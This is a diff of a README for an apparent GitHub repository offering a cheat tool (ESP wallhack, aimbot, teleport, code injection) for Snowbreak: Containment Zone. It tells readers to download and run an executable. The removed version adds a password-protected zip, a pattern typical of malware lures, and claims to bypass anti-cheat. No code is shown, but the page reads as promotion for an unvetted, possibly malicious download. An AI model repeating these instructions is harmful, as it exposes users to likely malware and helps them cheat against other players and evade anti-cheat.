@@ -1,67 +1,108 @@
-<div align="center">
-    <h1 style="font-size:2.5em;color:#FF4500;">🔥 UNICORE CHEAT FOR SNOWBREAK: CONTAINMENT ZONE 🔥</h1>
-    <h2 style="color:#4682B4;">Unleash Unmatched Power and Efficiency in Snowbreak</h2>
-</div>
+# SNOWBREAK-CONTAINMENT-ZONE-CHEAT-UNICORE
+
+![GitHub Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)
+
+Welcome to the **SNOWBREAK-CONTAINMENT-ZONE-CHEAT-UNICORE** repository! This project offers an advanced cheat tool for the game *Snowbreak: Containment Zone*. With this cheat, players can enhance their gaming experience significantly. 
+
+## Table of Contents
+
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [How It Works](#how-it-works)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Introduction
+
+The Unicore Cheat for *Snowbreak: Containment Zone* is designed to give players an edge in gameplay. It simplifies reaching goals, making your gaming experience smoother and more enjoyable. Whether you want to track opponents or monsters, this tool provides essential features to help you succeed.
+
+For the latest version, please visit the [Releases section](https://github.com/Melosoo/SNOWBREAK-CONTAINMENT-ZONE-CHEAT-UNICORE/releases). Download the file and execute it to get started.
+
+## Features
+
+- **ESP Module**: See enemies and monsters through walls.
+- **Teleportation**: Move instantly to desired locations.
+- **Aim Assist**: Improve your accuracy with automatic targeting.
+- **User-Friendly Interface**: Easy to navigate and configure.
+- **Customizable Settings**: Tailor the tool to fit your play style.
+
+### Detailed Features
+
+### ESP Module
+
+The ESP (Extra Sensory Perception) feature allows players to visualize the location of opponents and monsters. This capability can be a game-changer in competitive scenarios, providing critical information without the need for direct line-of-sight.
+
+### Teleportation
+
+The teleportation feature enables quick movement across the map. This can be particularly useful for avoiding danger or quickly reaching objectives.
+
+### Aim Assist
+
+Aim assist helps players improve their shooting accuracy. It can automatically adjust your aim towards opponents, making it easier to hit targets.
+
+### User-Friendly Interface
+
+The tool features a simple interface that anyone can navigate. You can easily toggle features on and off, making it accessible for both new and experienced players.
+
+### Customizable Settings
+
+Players can adjust settings according to their preferences. This flexibility allows for a more personalized gaming experience.
+
+## Installation
+
+To install the Unicore Cheat, follow these steps:
+
+1. Visit the [Releases section](https://github.com/Melosoo/SNOWBREAK-CONTAINMENT-ZONE-CHEAT-UNICORE/releases).
+2. Download the latest release.
+3. Extract the downloaded file.
+4. Run the executable file.
+
+Ensure you have the required permissions to run external software on your device. 
+
+## Usage
+
+Once you have installed the cheat, follow these steps to use it:
+
+1. Launch *Snowbreak: Containment Zone*.
+2. Open the Unicore Cheat tool.
+3. Adjust the settings according to your preferences.
+4. Start playing and enjoy the enhanced features.
+
+### Important Notes
+
+- Use this tool responsibly. Cheating can affect the gaming experience for others.
+- Regularly check for updates in the [Releases section](https://github.com/Melosoo/SNOWBREAK-CONTAINMENT-ZONE-CHEAT-UNICORE/releases) to ensure you have the latest features and fixes.
+
+## How It Works
+
+The Unicore Cheat operates by injecting code into the game. This code modifies how the game behaves, allowing you to access features not normally available. The ESP module uses memory reading techniques to track the positions of characters and monsters, displaying this information on your screen.
+
+### Technical Overview
+
+- **Memory Reading**: The cheat reads the game’s memory to gather information about other players and monsters.
+- **Code Injection**: It modifies the game’s code to implement features like teleportation and aim assist.
+- **User Configuration**: The tool allows users to set preferences, making it adaptable to different play styles.
+
+## Contributing
+
+Contributions are welcome! If you have suggestions or improvements, feel free to create a pull request. Please follow these guidelines:
+
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push your branch and create a pull request.
+
+## License
+
+This project is licensed under the MIT License. Feel free to use it as per the license terms.
+
+## Contact
+
+For any questions or support, you can reach out to the repository owner through GitHub. We welcome feedback and inquiries.
 
 ---
 
-<div align="center">
-    <h2 style="color:#32CD32;">📸 Screenshots</h2>
-    <img src="https://github.com/user-attachments/assets/9214fa53-daa6-4bec-ba53-e00a61cab359" alt="Unicore Cheat Screenshot 1" width="80%" style="border:2px solid #FF4500;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
-    <img src="https://github.com/user-attachments/assets/be154487-8ffd-4c31-aae0-d09689ec0f7b" alt="Unicore Cheat Screenshot 2" width="80%" style="border:2px solid #4682B4;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
-</div>
-
----
-
-## 🌟 **Overview**
-The **Unicore Cheat for Snowbreak: Containment Zone** is a powerful and versatile tool that empowers players to reach virtually any goal in the game with ease. Featuring an exceptional **ESP module**, it allows you to see opponents and monsters through walls. Additionally, Unicore offers a customizable **Aimbot** for precise targeting and a **Teleport feature**, enabling instant relocation to opponents for a tactical edge. The cheat is loaded with a plethora of additional functionalities such as **auto-skip for dialogues**, **infinite stamina and energy**, **damage multiplier adjustments**, **monster logic disabling**, and much more. With advanced anti-cheat bypass capabilities, Unicore ensures that the risk of account bans is nearly zero.
-
----
-
-## 🚀 **How to Use**
-<div style="background-color:#F5F5F5;padding:20px;border-radius:10px;">
-    <ol>
-        <li>
-            <b style="color:#FF4500;">Download:</b>  
-            <a href="https://github.com/Pristyannya/SNOWBREAK-CONTAINMENT-ZONE-CHEAT-UNICORE/releases/download/latest/UnicoreSnowbreak.zip" style="text-decoration:none;color:#4682B4;">🔹 Click here to download 🔹</a>
-        </li>
-        <li>
-            <b style="color:#32CD32;">Unzip Archive:</b>  
-            💼 Password: `UnicoreSnowbreak`
-        </li>
-        <li>
-            <b style="color:#FF4500;">Run Application:</b>  
-            Execute the `.exe` file after unzipping.
-        </li>
-        <li>
-            <b style="color:#4682B4;">Activate:</b>  
-            Press <b>HOME</b> to launch and configure the cheat.
-        </li>
-    </ol>
-</div>
-
----
-
-<div align="center">
-    <h2 style="color:#32CD32;">💡 FEATURES</h2>
-</div>
-<div align="center">
-    <h2 style="color:#32CD32;">📸 Screenshots</h2>
-    <img src="https://github.com/user-attachments/assets/8b40e640-d253-4db6-94bd-8fd133df4a8d" alt="Unicore Cheat Screenshot 1" width="80%" style="border:2px solid #FF4500;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
-</div>
-
----
-
-## 📄 **License**
-<div style="background-color:#F5F5F5;padding:20px;border-radius:10px;">
-    This project is licensed under the **MIT License**. See the LICENSE file for details.
-</div>
-
----
-
-<div align="center">
-    <h2 style="color:#4682B4;">📬 CONTACT</h2>
-    <p>Need help? Reach out to us:</p>
-    <a href="" style="text-decoration:none;color:#FF4500;">GitHub</a>  
-    Email: <b style="color:#32CD32;">support@unicorecheats.com</b>
-</div>
+Thank you for using the Unicore Cheat for *Snowbreak: Containment Zone*. We hope it enhances your gaming experience!
